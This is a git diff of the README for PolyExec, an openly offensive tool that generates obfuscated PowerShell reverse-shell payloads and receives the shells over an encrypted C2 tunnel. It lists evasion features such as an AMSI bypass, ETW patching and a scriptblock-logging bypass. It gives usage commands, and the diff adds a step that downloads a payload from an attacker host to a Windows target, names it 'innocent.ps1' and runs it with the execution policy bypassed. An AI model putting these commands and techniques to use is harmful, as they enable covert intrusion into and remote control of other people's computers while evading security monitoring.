@@ -1,34 +1,37 @@
 ## PolyExec: Generate polymorphic ps payloads and catch the shells in an aes-256 tunnel. 
+#### Tested on Debian, Fedora, Windows 10, Windows 11 25H2 KB5074109
 
-#### polyexecgen.py - Generate obfuscated PS payloads <br>
-#### c2_catcher.py - Receive the encrypted tunnel
+##### polyexecgen.py - Generate obfuscated PS payloads <br>
+##### c2_catcher.py - Receive the encrypted tunnel
 
 --- 
 
-### C2 Shell Catcher: <br>
+### Features:
 
-TCP - Basic reverse shell (simple)<br>
-Encrypted - AES-256 encrypted TCP (normal)<br>
-HTTP - HTTP/HTTPS (80 or 443)<br>
-DNS - DNS(sneaky)<br>
-AES-256<br>
+AES-256 encrypted TCP tunnel(normal)<br>
+TCP Basic reverse shell (simple)<br>
+HTTP/HTTPS (80 or 443)<br>
+DNS(sneaky)<br>
 multi session threaded<br>
 custom keys<br>
-
-### Evasion features:<br>
 AMSI bypass<br>
 ETW patching<br>
-scriptBlock log bypass<br>
+scriptblock log bypass<br>
 prng variable names<br>
 junk code<br>
-no two payloads alike<br>
 Traffic jitter<br>
 
 ---
 
 ### PolyExec Gen Usage:
 
-    $ chmod +x polyexecgen.py c2_catcher.py
+##### install requirements:
+
+    pip install -r requirements.txt
+
+##### Make executable:
+
+    chmod +x polyexecgen.py c2_catcher.py
 
 ##### Encrypted shell -- full evasion:
 
@@ -48,7 +51,7 @@ Traffic jitter<br>
 
 
 ### C2 Catcher Usage:
-##### (to listen on privileged ports...< 1024, like 443 or 80), you need to run as sudo)
+##### (to listen on privileged ports...< 1024, like 443 or 80), run as sudo)
 
 ##### Encrypted listener
 
@@ -70,6 +73,13 @@ Traffic jitter<br>
     
     # Select 3, add host/port/encryption setting
 
+
+#### On windows target, aquire from host and execute payload:
+
+    PS C:\Users\windows> Invoke-WebRequest -Uri http://xx.xx.xx.xxx:8000/polyexec_encrypted_*.ps1 -OutFile innocent.ps1
+    
+    PS C:\Users\windows> powershell.exe -ExecutionPolicy Bypass -File innocent.ps1
+    
 <br>
 
 ---
